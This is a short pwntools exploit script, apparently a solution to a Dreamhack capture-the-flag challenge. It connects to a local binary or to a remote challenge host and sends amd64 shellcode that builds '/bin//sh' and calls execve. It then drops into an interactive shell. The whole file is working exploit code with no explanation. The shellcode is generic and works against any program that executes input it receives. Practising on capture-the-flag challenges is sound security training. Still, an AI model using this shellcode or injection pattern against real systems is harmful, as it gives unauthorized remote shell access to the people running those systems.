#!/usr/bin/python3

from pwn import *

exe = ELF("./main")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''
#         b *main+170
#         c
#         ''')
#         input()


if args.REMOTE:
    p = remote('host8.dreamhack.games', 21953)
else:
    p = process([exe.path])
# GDB()
shellcode = asm('''
    xor eax, eax
    push rax
    push 1752379183
    push 1852400175
    pop rax                   
    pop rbx                 
    shl rbx, 32               
    add rax, rbx             
    push rax

    push rsp
    pop rdi
    
    xor esi, esi
    xor edx, edx
    
    push 0x3b
    pop rax
    
    syscall
    ''', arch='amd64'
)
sa(b'> ', shellcode)


p.interactive()

